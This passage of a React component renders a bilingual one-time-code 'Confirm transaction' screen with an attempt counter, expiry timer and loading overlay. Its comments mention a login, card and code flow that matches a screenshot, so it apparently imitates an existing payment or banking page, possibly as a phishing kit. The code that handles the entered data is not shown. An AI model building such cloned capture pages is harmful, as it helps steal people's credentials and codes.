                {language === "es" ? "Confirmar transacción" : "Confirm transaction"}
              </h2>

              {/* Subtitle */}
              <p className="text-[11.5px] text-[#64748b] text-center leading-relaxed mb-4 max-w-[270px]">
                {language === "es"
                  ? "Introduzca el código de 6 dígitos enviado a su número móvil para autorizar esta acción."
                  : "Enter the 6-digit code sent to your mobile number to authorise this action."}
              </p>

              {/* 6 OTP Boxes */}
              <div
                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
                  confirmShake > 0 ? "animate-shake" : ""
                }`}
              >
                {confirmOtp.map((digit, idx) => {
                  const isFocused = confirmFocusedIndex === idx
                  const boxBorderClass = hasConfirmError
                    ? isFocused
                      ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                      : "border-[#ef4444]"
                    : isFocused
                    ? "border-[#058998] ring-1 ring-[#058998]"
                    : "border-[#cbd5e1]"

                  return (
                    <input
                      key={idx}
                      ref={(el) => {
                        confirmOtpRefs.current[idx] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={digit}
                      onFocus={() => setConfirmFocusedIndex(idx)}
                      onBlur={() => setConfirmFocusedIndex(null)}
                      onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
                      onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
                      className={`w-full h-[50px] sm:h-[52px] text-center text-[21px] sm:text-[22px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
                    />
                  )
                })}
              </div>

              {/* Error Banner: ⓘ Incorrect code. Please try again. */}
              {hasConfirmError && (
                <div className="w-full max-w-[340px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
                  <svg
                    className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
                    viewBox="0 0 24 24"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                  <span>
                    {language === "es"
                      ? "Código incorrecto. Por favor, inténtelo de nuevo."
                      : confirmErrorMessage}
                  </span>
                </div>
              )}

              {/* Attempt Counter: Attempt 1 / 3 */}
              <p className="text-[11px] font-medium text-[#64748b] text-center mb-1">
                {language === "es" ? "Intento" : "Attempt"} {confirmAttempt} / 3
              </p>

              {/* Countdown Timer: Code expires in 2:58 */}
              <p className="text-[11.5px] text-[#475569] text-center mb-2 font-medium">
                {language === "es" ? "El código caduca en " : "Code expires in "}
                <span className="font-bold text-[#0f172a]">{formatTimer(confirmTimeLeft)}</span>
              </p>

              {/* Resend Code Button */}
              <button
                type="button"
                onClick={handleResendConfirmOtp}
                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#058998] transition-colors cursor-pointer font-medium mb-4"
              >
                <RotateCw className="w-3 h-3 stroke-[2.2]" />
                <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
              </button>

              {/* Confirm Button */}
              <button
                type="button"
                disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
                onClick={handleConfirmOtpSubmit}
                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
                  confirmOtp.join("").length === 6 && !isConfirmSubmitting
                    ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer"
                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                {isConfirmSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-4 w-4 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "es" ? "CONFIRMANDO..." : "CONFIRMING..."}</span>
                  </div>
                ) : language === "es" ? (
                  "Confirmar"
                ) : (
                  "Confirm"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2-SECOND BLURRED LOADING OVERLAY (MATCHING SCREENSHOT 1)                  */}
      {/* Active on transition: Login -> Card and Card -> OTP                       */}
      {/* ========================================================================= */}
      {isScreenLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#e6f4f6]/70 backdrop-blur-md animate-in fade-in duration-200">
          <div
            className="w-[44px] h-[44px] rounded-full border-[3.5px] animate-spin"
            style={{
              borderColor: "rgba(5, 137, 152, 0.2)",
              borderTopColor: "#058998",
            }}
          />
        </div>
      )}

      {/* Shake Keyframe animation */}
      <style jsx global>{`
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .animate-shake {
          animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }
      `}</style>
    </div>
  )
}
